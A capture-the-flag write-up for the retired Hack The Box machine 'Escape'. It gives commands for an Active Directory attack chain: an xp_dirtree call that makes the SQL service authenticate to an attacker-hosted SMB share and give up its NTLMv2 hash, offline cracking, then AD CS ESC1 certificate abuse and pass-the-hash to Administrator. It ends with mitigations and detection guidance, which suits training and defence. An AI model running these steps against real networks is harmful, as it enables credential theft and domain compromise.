---
machine: Escape
os: Windows
difficulty: Medium
platform: Hack The Box
category: Active Directory / Windows
state: Retired
tags: [windows, active-directory, mssql, ntlm-capture, adcs, esc1, certipy]
---

# Escape — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no flags or real credentials.

## TL;DR

The `Public` share opens to guests and holds `SQL Server Procedures.pdf`, a "manual" with MSSQL credentials. `PublicUser` is neither `sysadmin` nor able to run `xp_cmdshell`, but `xp_dirtree` works: point it at your own share and the SQL service authenticates, handing over `sql_svc`'s NTLMv2 hash. Cracked, that account reaches the `ERRORLOG.BAK` backup, which leaks `Ryan.Cooper`'s password. Ryan is a domain user and the CA has **`UserAuthentication` with ESC1**: request a certificate with `Administrator`'s UPN, authenticate with it and get his hash.

## Recon

```bash
nmap -p- --min-rate 5000 -T4 <IP> -oN nmap_all.txt
nmap -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985 -sCV <IP> -oN nmap_svc.txt
```

```text
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: sequel.htb)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ssl/ldap
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00
3268/tcp  open  ldap          Global Catalog
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

`MSSQL` and `WinRM` on the same host: the first gives the hash, the second the final access.

```bash
echo "<IP> sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
```

## Enumeration

```bash
smbclient -L //<IP> -N
smbclient //<IP>/Public -N
# get "SQL Server Procedures.pdf"
```

The PDF is aimed at administrators and carries connection credentials for the instance: SQL login **`PublicUser`**.

```bash
impacket-mssqlclient <IP> -u PublicUser -p '<PASSWORD>'
```

Checks inside the instance:

```sql
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';       -- denied for this login
```

`PublicUser` is not `sysadmin` and `xp_cmdshell` is out of reach, but `xp_dirtree` is available: it resolves a UNC path and the SQL service authenticates against it.

## Foothold

Hash capture with a local SMB share:

```bash
impacket-smbserver share /tmp/share -smb2support
# from the SQL session:
EXEC master..xp_dirtree '\\<LHOST>\share\a';
```

The service account's NTLMv2 hash shows up on the SMB server and is cracked offline:

```bash
hashcat -m 5600 sql_svc.hash rockyou.txt
impacket-mssqlclient <IP> -u sql_svc -p '<PASSWORD>'
```

## Lateral movement

With `sql_svc` the instance's errorlog backup (`ERRORLOG.BAK`) is readable, and it includes **`Ryan.Cooper`**'s password in a connection entry. Classic pattern: the log that "only exists for debugging" holds credentials.

```bash
nxc smb <IP> -u Ryan.Cooper -p '<PASSWORD>'
```

## Privilege escalation

AD CS enumeration:

```bash
certipy find -u Ryan.Cooper@sequel.htb -p '<PASSWORD>' -dc-ip <IP> -vulnerable -stdout
```

Template **`UserAuthentication`** meets ESC1: `Domain Users` may enrol, it allows *Client Authentication*, and the requester can supply the certificate subject (`ENROLLEE_SUPPLIES_SUBJECT`). That turns any user into any other:

```bash
certipy req -u Ryan.Cooper@sequel.htb -p '<PASSWORD>' \
  -ca '<CA_NAME>' -template UserAuthentication \
  -upn administrator@sequel.htb -dc-ip <IP>
```

```bash
certipy auth -pfx administrator.pfx -dc-ip <IP>
```

`certipy auth` returns `Administrator`'s NTLM hash (PKINIT + UnPAC-the-hash). With it:

```bash
evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
```

If the `-upn` does not resolve to the target object, `-sid S-1-5-21-...-500` pins the real Administrator RID; it is not mandatory in the normal case.

## Evidence

- Trimmed output from the hash capture, `certipy find` and `certipy auth`.
- No flags, hashes or passwords: real values live in `private/`.

## Lessons learned

- A PDF on a "public" share is internal documentation: read all of it.
- `xp_dirtree` is network egress from SQL even without `xp_cmdshell`.
- A service account hash is worth more than the SQL instance itself: it is reused on SMB/WinRM.
- Log backups keep credentials that the rotated log no longer shows.
- ESC1 does not need admin: `Domain Users` enrolling on a supplied-subject template is enough.

## Mitigations and detection

- Strip `xp_dirtree`/`xp_fileexist` from application logins and block SMB egress from the SQL server.
- gMSA service accounts with 120-character passwords make cracking non-viable.
- Keep log backups out of service-readable paths; rotate and sanitise them.
- In AD CS: remove `ENROLLEE_SUPPLIES_SUBJECT` from Client Authentication templates and restrict enrolment to specific groups; audit with `certipy find -vulnerable`.
- Detection: 4662 on the CA, certificate requests whose UPN differs from the requester (4886/4887 and CA logs), and unusual PKINIT logons (4768 with `Certificate Information`).

MITRE: T1557 (AiTM), T1558.003 (kerberoasting), T1649 (steal or forge certificates), T1550.002 (pass the hash).

## References

- <https://www.hackthebox.com/machines/escape>
- <https://adityatelange.in/writeups/hackthebox/escape>
- <https://chaelsoo.me/writeups/htb-escape>
- <https://github.com/ly4k/Certipy>
- <https://learn.microsoft.com/en-us/defender-for-identity/security-alert-certificate-services>
